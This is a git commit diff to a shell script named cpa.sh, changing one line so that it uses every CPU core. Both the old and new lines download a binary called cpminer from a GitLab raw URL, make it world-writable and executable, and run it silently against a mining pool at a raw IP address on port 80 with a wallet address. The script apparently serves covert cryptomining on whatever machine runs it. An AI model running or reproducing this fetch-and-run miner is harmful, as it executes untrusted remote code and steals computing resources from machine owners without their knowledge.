c287c22ff45c27775d36f34cf3a428f70088f7c8
Johncenayan <John12001455@sanggarnugraha.org>
2025-03-13 04:47:30 +0700

    Update cpa.sh

--- cpa.sh
+++ cpa.sh
@@ -1,1 +1,1 @@
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar -o stratum+tcp://134.122.127.150:80 -u DJqvjYWEvv8UhkotnmAxXut2ZPMwvLTBtS -p c=DOGE,mc=SUGAR,ID=srantal -t4 > /dev/null 2>&1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar -o stratum+tcp://134.122.127.150:80 -u DJqvjYWEvv8UhkotnmAxXut2ZPMwvLTBtS -p c=DOGE,mc=SUGAR,ID=srantal -t$(nproc --all) > /dev/null 2>&1
